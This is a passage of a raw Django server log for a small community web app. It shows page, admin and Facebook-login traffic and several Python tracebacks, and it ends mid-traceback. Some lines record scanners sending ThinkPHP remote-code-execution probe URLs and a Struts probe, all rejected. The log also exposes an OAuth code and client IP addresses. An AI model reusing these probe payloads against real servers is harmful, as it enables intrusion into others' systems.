[19/Dec/2018 08:41:36] "GET / HTTP/1.0" 400 62604
[19/Dec/2018 09:05:17] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 09:05:19] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 304 0
[19/Dec/2018 09:06:41] "GET /community/5/ HTTP/1.1" 200 15031
Not Found: /community/media/media/favicon.ico
[19/Dec/2018 09:06:42] "GET /community/media/media/favicon.ico HTTP/1.1" 404 6031
[19/Dec/2018 09:06:49] "GET /profile/12 HTTP/1.1" 200 19438
[19/Dec/2018 09:07:26] "GET /community/5/ HTTP/1.1" 200 15031
[19/Dec/2018 09:07:43] "GET /community/5/join HTTP/1.1" 200 6816
[19/Dec/2018 09:07:47] "GET /community/5/join HTTP/1.1" 200 6816
[19/Dec/2018 09:07:56] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 09:08:17] "GET /admin/ HTTP/1.1" 302 0
[19/Dec/2018 09:08:18] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1993
[19/Dec/2018 09:08:18] "GET /static/admin/css/base.css HTTP/1.1" 200 16225
[19/Dec/2018 09:08:19] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
[19/Dec/2018 09:08:19] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17976
[19/Dec/2018 09:08:20] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
Not Found: /favicon.ico
[19/Dec/2018 09:08:21] "GET /favicon.ico HTTP/1.1" 404 5965
[19/Dec/2018 09:08:22] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[19/Dec/2018 09:08:23] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[19/Dec/2018 09:08:24] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
[19/Dec/2018 09:08:35] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[19/Dec/2018 09:08:36] "GET /admin/ HTTP/1.1" 200 12428
[19/Dec/2018 09:08:36] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
[19/Dec/2018 09:08:38] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
[19/Dec/2018 09:08:38] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
[19/Dec/2018 09:08:39] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
[19/Dec/2018 09:08:44] "GET /admin/togther/form_data/ HTTP/1.1" 200 5596
[19/Dec/2018 09:08:44] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6170
[19/Dec/2018 09:08:45] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[19/Dec/2018 09:08:47] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 271751
[19/Dec/2018 09:08:47] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
[19/Dec/2018 09:08:48] "GET /static/admin/js/core.js HTTP/1.1" 200 7134
[19/Dec/2018 09:08:48] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6918
[19/Dec/2018 09:08:49] "GET /static/admin/js/actions.js HTTP/1.1" 200 6538
[19/Dec/2018 09:08:49] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8972
[19/Dec/2018 09:08:50] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1530
[19/Dec/2018 09:08:51] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 128820
[19/Dec/2018 09:08:53] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 09:21:38] "GET / HTTP/1.1" 400 62288
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 09:31:51] "GET / HTTP/1.1" 400 62290
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 09:37:34] "GET / HTTP/1.1" 400 62288
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 09:54:28] "GET / HTTP/1.1" 400 62290
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 10:50:22] "GET / HTTP/1.1" 400 62516
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 11:18:06] "GET / HTTP/1.1" 400 62413
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /index.php
[19/Dec/2018 11:26:32] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 400 64169
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /public/index.php
[19/Dec/2018 11:26:33] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 400 64246
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /html/public/index.php
[19/Dec/2018 11:26:34] "GET /html/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 400 64301
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /thinkphp/public/index.php
[19/Dec/2018 11:26:34] "GET /thinkphp/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 400 64345
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /thinkphp/html/public/index.php
[19/Dec/2018 11:26:35] "GET /thinkphp/html/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 400 64400
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /TP/index.php
[19/Dec/2018 11:26:35] "GET /TP/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 400 64202
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /TP/public/index.php
[19/Dec/2018 11:26:36] "GET /TP/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 400 64279
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /TP/html/public/index.php
[19/Dec/2018 11:26:37] "GET /TP/html/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 400 64334
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 11:43:13] "GET / HTTP/1.0" 400 62302
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 12:02:40] "GET / HTTP/1.0" 400 62302
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 12:05:27] "GET / HTTP/1.1" 400 62683
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 37, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[19/Dec/2018 12:11:27] "GET / HTTP/1.1" 500 68154
[19/Dec/2018 12:11:38] "GET /logout HTTP/1.1" 302 0
[19/Dec/2018 12:11:39] "GET /login/ HTTP/1.1" 200 2762
Not Found: /login/logo.jpeg
[19/Dec/2018 12:11:40] "GET /login/logo.jpeg HTTP/1.1" 404 5977
[19/Dec/2018 12:11:43] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[19/Dec/2018 12:11:45] "GET /oauth/complete/facebook/?granted_scopes=email%2Cpublic_profile&denied_scopes&code=AQAv-2GMcsRaecGe_FcQoYKepFdMJ8ZFMy6b00oF_QKZuSEx6lKEz6iDf5WWb4AdNvKD5-_Kjjnvh7nxHGaX8PjR7uMC1T2EOGwMGDytkOMa0YkvKVGXiqwYjGqmvB60UBklu-qtpW0Y8TJkqytBRDCUNFHmDaMfPjvbnqsjE7_QyFPdAPYp5AWNMNc9RzMzoTu4Y9j-tMTyL3Vn2tUIZ6khFMm6rJ1Tbm0Xh-FIp7-SMu-Fi9c3dGZrXDOKHHbglO7izdIiOfloGMFhRzl7Ll2hW90ieIv8wai41i0Sjv7-vpx1tMgBJFhfq9YzYjA22ut73-MhCctErEJPFzNsYG6U1jm8TzXT3jMmZ-xowamcRA&state=0SSo2ijET4hnsagfXK1FqiLRLoBgNOwj HTTP/1.1" 302 0
[19/Dec/2018 12:11:45] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 12:11:47] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 304 0
[19/Dec/2018 12:12:01] "GET /profile/9 HTTP/1.1" 200 24074
[19/Dec/2018 12:12:09] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 12:12:15] "GET /community/5/ HTTP/1.1" 200 15031
[19/Dec/2018 12:12:28] "GET /community/3/ HTTP/1.1" 200 15892
[19/Dec/2018 12:12:37] "GET /profile/12 HTTP/1.1" 200 19438
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 12:13:21] "GET / HTTP/1.1" 400 62289
[19/Dec/2018 12:15:00] "GET /creategroup/ HTTP/1.1" 200 10422
[19/Dec/2018 12:15:11] "GET /profile/5 HTTP/1.1" 200 24654
[19/Dec/2018 12:15:12] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[19/Dec/2018 12:15:13] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[19/Dec/2018 12:15:25] "GET / HTTP/1.1" 200 22141
[19/Dec/2018 12:15:26] "GET /media/media/logo.png HTTP/1.1" 200 11255
[19/Dec/2018 12:15:26] "GET /media/media/3.png HTTP/1.1" 200 62062
[19/Dec/2018 12:15:27] "GET /media/media/1.png HTTP/1.1" 200 217917
[19/Dec/2018 12:15:27] "GET /media/media/2.png HTTP/1.1" 200 218829
[19/Dec/2018 12:15:41] "GET /community/5 HTTP/1.1" 301 0
[19/Dec/2018 12:15:41] "GET /community/5/ HTTP/1.1" 200 14714
[19/Dec/2018 12:15:43] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
----------------------------------------
Exception happened during processing of request from ('47.247.166.203', 48688)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 313, in _handle_request_noblock
    self.process_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 344, in process_request
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
    return self._sock.recv_into(b)
  File "/usr/lib64/python3.7/ssl.py", line 1049, in recv_into
    return self.read(nbytes, buffer)
  File "/usr/lib64/python3.7/ssl.py", line 908, in read
    return self._sslobj.read(len, buffer)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[19/Dec/2018 12:15:44] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[19/Dec/2018 12:15:45] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[19/Dec/2018 12:15:47] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
Not Found: /community/media/media/favicon.ico
[19/Dec/2018 12:15:48] "GET /community/media/media/favicon.ico HTTP/1.1" 404 6030
[19/Dec/2018 12:16:05] "GET /login/ HTTP/1.1" 302 0
[19/Dec/2018 12:16:06] "GET / HTTP/1.1" 200 22141
[19/Dec/2018 12:16:06] "GET /media/media/3.png HTTP/1.1" 200 62062
[19/Dec/2018 12:16:07] "GET /media/media/2.png HTTP/1.1" 200 218829
[19/Dec/2018 12:16:07] "GET /media/media/1.png HTTP/1.1" 200 217917
[19/Dec/2018 12:16:09] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 12:16:11] "GET / HTTP/1.1" 200 22141
[19/Dec/2018 12:16:12] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 12:16:59] "GET / HTTP/1.1" 200 22153
[19/Dec/2018 12:17:02] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
[19/Dec/2018 12:17:13] "GET /?data=Alumni&_=1545221771624 HTTP/1.1" 200 516
[19/Dec/2018 12:17:22] "GET /?data=College&_=1545221771625 HTTP/1.1" 200 19
[19/Dec/2018 12:17:29] "GET /?data=Sports&_=1545221771626 HTTP/1.1" 200 19
[19/Dec/2018 12:17:56] "GET /?data=Sports+%26+Fitness&_=1545221771627 HTTP/1.1" 200 1144
[19/Dec/2018 12:18:20] "GET /creategroup/ HTTP/1.1" 200 10410
[19/Dec/2018 12:18:21] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 12:20:17] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 12:23:40] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 12:24:54] "GET /community/5 HTTP/1.1" 301 0
[19/Dec/2018 12:24:54] "GET /community/5/ HTTP/1.1" 200 15045
[19/Dec/2018 12:24:57] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
Not Found: /community/media/media/favicon.ico
[19/Dec/2018 12:25:02] "GET /community/media/media/favicon.ico HTTP/1.1" 404 6030
[19/Dec/2018 12:35:54] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 12:36:00] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 12:36:02] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 12:53:16] "POST /creategroup/ HTTP/1.1" 302 0
[19/Dec/2018 12:53:16] "GET /creategroup/6/form_data HTTP/1.1" 200 9681
Not Found: /creategroup/media/media/favicon.ico
[19/Dec/2018 12:53:17] "GET /creategroup/media/media/favicon.ico HTTP/1.1" 404 6036
[19/Dec/2018 12:55:13] "POST /creategroup/6/form_data HTTP/1.1" 302 0
[19/Dec/2018 12:55:13] "GET /community/6/ HTTP/1.1" 200 14915
[19/Dec/2018 12:55:14] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 200 80581
[19/Dec/2018 12:55:14] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[19/Dec/2018 12:55:14] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[19/Dec/2018 12:55:17] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
[19/Dec/2018 12:55:18] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 200 80581
[19/Dec/2018 12:55:26] "GET /login/ HTTP/1.1" 302 0
[19/Dec/2018 12:55:26] "GET / HTTP/1.1" 200 23537
[19/Dec/2018 12:55:27] "GET /media/media/3.png HTTP/1.1" 200 62062
[19/Dec/2018 12:55:28] "GET /media/media/1.png HTTP/1.1" 200 217917
[19/Dec/2018 12:55:28] "GET /media/media/2.png HTTP/1.1" 200 218829
[19/Dec/2018 12:55:29] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 13:24:22] "GET / HTTP/1.1" 400 62515
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 13:39:05] "GET / HTTP/1.1" 400 62528
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 13:45:16] "GET / HTTP/1.1" 400 62290
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 13:47:25] "GET / HTTP/1.0" 400 62301
[19/Dec/2018 13:48:42] "GET / HTTP/1.1" 200 23535
[19/Dec/2018 13:48:44] "GET /media/media/logo.png HTTP/1.1" 304 0
[19/Dec/2018 13:48:45] "GET /media/media/1.png HTTP/1.1" 304 0
[19/Dec/2018 13:48:45] "GET /media/media/2.png HTTP/1.1" 304 0
[19/Dec/2018 13:48:46] "GET /media/media/3.png HTTP/1.1" 304 0
[19/Dec/2018 13:48:46] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 304 0
[19/Dec/2018 13:48:48] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 200 80581
[19/Dec/2018 13:48:49] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[19/Dec/2018 13:49:36] "GET /community/6 HTTP/1.1" 301 0
[19/Dec/2018 13:49:37] "GET /community/6/ HTTP/1.1" 200 15232
[19/Dec/2018 13:59:18] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
[19/Dec/2018 13:59:18] "GET / HTTP/1.1" 200 22756
[19/Dec/2018 13:59:19] "GET /media/media/logo.png HTTP/1.1" 200 11255
[19/Dec/2018 13:59:19] "GET /media/media/3.png HTTP/1.1" 200 62062
[19/Dec/2018 13:59:20] "GET /media/media/1.png HTTP/1.1" 200 217917
[19/Dec/2018 13:59:20] "GET /media/media/2.png HTTP/1.1" 200 218829
[19/Dec/2018 13:59:22] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
[19/Dec/2018 13:59:23] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 13:59:25] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 200 80581
[19/Dec/2018 13:59:27] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[19/Dec/2018 13:59:32] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[19/Dec/2018 13:59:42] "GET /community/5 HTTP/1.1" 301 0
[19/Dec/2018 13:59:43] "GET /community/5/ HTTP/1.1" 200 15033
[19/Dec/2018 13:59:52] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
[19/Dec/2018 14:05:15] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 14:07:01] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 14:07:21] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 14:09:48] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 14:10:33] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 14:11:29] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 14:11:38] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 14:11:44] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 14:11:56] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 14:23:57] "GET / HTTP/1.0" 400 62301
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 14:36:02] "GET / HTTP/1.1" 400 62485
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /index.action
[19/Dec/2018 14:36:06] "GET /index.action HTTP/1.1" 400 63476
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 14:46:48] "GET / HTTP/1.1" 400 62409
Not Found: /robots.txt
[19/Dec/2018 15:06:12] "GET /robots.txt HTTP/1.1" 404 5961
[19/Dec/2018 15:06:16] "GET /community/3/members_list HTTP/1.1" 200 9436
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 15:09:47] "GET / HTTP/1.1" 400 62296
[19/Dec/2018 15:11:00] "GET / HTTP/1.1" 200 23535
[19/Dec/2018 15:11:01] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 304 0
[19/Dec/2018 15:11:04] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 200 80581
[19/Dec/2018 15:11:04] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[19/Dec/2018 15:12:50] "GET /creategroup/ HTTP/1.1" 200 10408
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 15:32:56] "GET / HTTP/1.0" 400 62301
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
TimeoutError: [Errno 110] Connection timed out
[19/Dec/2018 15:32:56] "GET / HTTP/1.0" 500 59
----------------------------------------
Exception happened during processing of request from ('88.247.96.125', 58468)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
TimeoutError: [Errno 110] Connection timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
[19/Dec/2018 15:53:39] "GET / HTTP/1.1" 200 23551
[19/Dec/2018 15:53:41] "GET /media/media/1.png HTTP/1.1" 304 0
[19/Dec/2018 15:53:41] "GET /media/media/2.png HTTP/1.1" 304 0
[19/Dec/2018 15:53:41] "GET /media/media/3.png HTTP/1.1" 304 0
[19/Dec/2018 15:53:43] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
[19/Dec/2018 15:53:44] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 200 80581
[19/Dec/2018 15:55:04] "GET / HTTP/1.1" 200 23551
[19/Dec/2018 15:55:19] "GET /community/5 HTTP/1.1" 301 0
[19/Dec/2018 15:55:19] "GET /community/5/ HTTP/1.1" 200 15789
[19/Dec/2018 15:55:21] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
Not Found: /community/media/media/favicon.ico
[19/Dec/2018 15:55:23] "GET /community/media/media/favicon.ico HTTP/1.1" 404 6030
[19/Dec/2018 15:55:35] "GET /community/5/members_list HTTP/1.1" 200 7934
[19/Dec/2018 15:55:40] "GET / HTTP/1.1" 200 23551
[19/Dec/2018 15:55:43] "GET /logout HTTP/1.1" 302 0
[19/Dec/2018 15:55:43] "GET /login/ HTTP/1.1" 200 2762
Not Found: /login/logo.jpeg
[19/Dec/2018 15:55:44] "GET /login/logo.jpeg HTTP/1.1" 404 5976
[19/Dec/2018 15:55:57] "GET / HTTP/1.1" 200 22756
[19/Dec/2018 15:55:59] "GET /media/media/logo.png HTTP/1.1" 200 11255
[19/Dec/2018 15:56:01] "GET /media/media/3.png HTTP/1.1" 200 62062
[19/Dec/2018 15:56:01] "GET /media/media/1.png HTTP/1.1" 200 217917
[19/Dec/2018 15:56:02] "GET /media/media/2.png HTTP/1.1" 200 218829
[19/Dec/2018 15:56:04] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
[19/Dec/2018 15:56:05] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 200 80581
[19/Dec/2018 15:56:06] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[19/Dec/2018 15:56:08] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[19/Dec/2018 15:56:51] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[19/Dec/2018 15:57:17] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
Internal Server Error: /oauth/complete/facebook/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/views/decorators/cache.py", line 44, in _wrapped_view_func
    response = view_func(request, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_django/utils.py", line 49, in wrapper
    return func(request, backend, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_django/views.py", line 33, in complete
